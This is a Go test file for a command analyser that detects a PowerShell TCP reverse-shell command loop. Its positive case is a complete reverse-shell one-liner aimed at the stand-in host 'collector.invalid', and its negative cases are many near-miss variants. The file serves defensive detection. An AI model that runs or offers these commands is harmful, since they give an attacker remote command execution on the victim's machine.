// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import "testing"

func TestExactPowerShellTCPCommandLoop(t *testing.T) {
	positive := `$c = New-Object Net.Sockets.TCPClient('collector.invalid',4444); $s = $c.GetStream(); ` +
		`while(($i = $s.Read($b,0,$b.Length)) -ne 0){$d = ([Text.Encoding]::ASCII).GetString($b,0,$i); ` +
		`$r = (iex $d 2>&1 | Out-String); $o = ([Text.Encoding]::ASCII).GetBytes($r); $s.Write($o,0,$o.Length)}`
	if facts := Analyze(Input{Tool: "shell", Command: positive, DialectHint: DialectPowerShell}); !ExactPowerShellTCPCommandLoop(facts) {
		t.Fatalf("missing exact PowerShell TCP command-loop fact: %+v", facts)
	}
	for _, negative := range []string{
		`$c = New-Object Net.Sockets.TCPClient('service.internal',443); $s = $c.GetStream()`,
		`$c = New-Object Net.Sockets.TCPClient($host,4444); $s = $c.GetStream(); $s.Read($b,0,1); iex $d; $s.Write($b,0,1)`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $other.GetStream(); $s.Read($b,0,1); iex $d; $s.Write($b,0,1)`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $c.GetStream(); $other.Read($b,0,1); iex $d; $s.Write($b,0,1)`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $c.GetStream(); $s.Read($b,0,1); iex $d; $other.Write($b,0,1)`,
		`$c = New-Object Net.Sockets.TCPClient('127.0.0.1',4444); $s = $c.GetStream(); while(($i = $s.Read($b,0,$b.Length)) -ne 0){$d = ([Text.Encoding]::ASCII).GetString($b,0,$i); $r = (iex $d | Out-String); $o = ([Text.Encoding]::ASCII).GetBytes($r); $s.Write($o,0,$o.Length)}`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $c.GetStream(); while(($i = $s.Read($b,0,$b.Length)) -ne 0){$d = ([Text.Encoding]::ASCII).GetString($other,0,$i); $r = (iex $d | Out-String); $o = ([Text.Encoding]::ASCII).GetBytes($r); $s.Write($o,0,$o.Length)}`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $c.GetStream(); while(($i = $s.Read($b,0,$b.Length)) -ne 0){$d = ([Text.Encoding]::ASCII).GetString($b,0,$i); $r = (iex $local | Out-String); $o = ([Text.Encoding]::ASCII).GetBytes($r); $s.Write($o,0,$o.Length)}`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $c.GetStream(); while(($i = $s.Read($b,0,$b.Length)) -ne 0){$d = ([Text.Encoding]::ASCII).GetString($b,0,$i); $r = (iex $d | Out-String); $o = ([Text.Encoding]::ASCII).GetBytes($unrelated); $s.Write($o,0,$o.Length)}`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $c.GetStream(); while(($i = $s.Read($b,0,$b.Length)) -ne 0){$d = ([Text.Encoding]::ASCII).GetString($b,0,$i); $r = (iex $d | Out-String); $o = ([Text.Encoding]::ASCII).GetBytes($r); $s.Write($other,0,$other.Length)}`,
		`$c = New-Object Net.Sockets.TCPClient('host.invalid',4444); $s = $c.GetStream(); $i = $s.Read($b,0,$b.Length); $d = ([Text.Encoding]::ASCII).GetString($b,0,$i); $r = (iex $d | Out-String); $o = ([Text.Encoding]::ASCII).GetBytes($r); $s.Write($o,0,$o.Length)`,
		`Write-Output "New-Object Net.Sockets.TCPClient then GetStream Read iex Write"`,
	} {
		if facts := Analyze(Input{Tool: "shell", Command: negative, DialectHint: DialectPowerShell}); ExactPowerShellTCPCommandLoop(facts) {
			t.Fatalf("negative produced a PowerShell TCP command-loop fact: %q", negative)
		}
	}
}
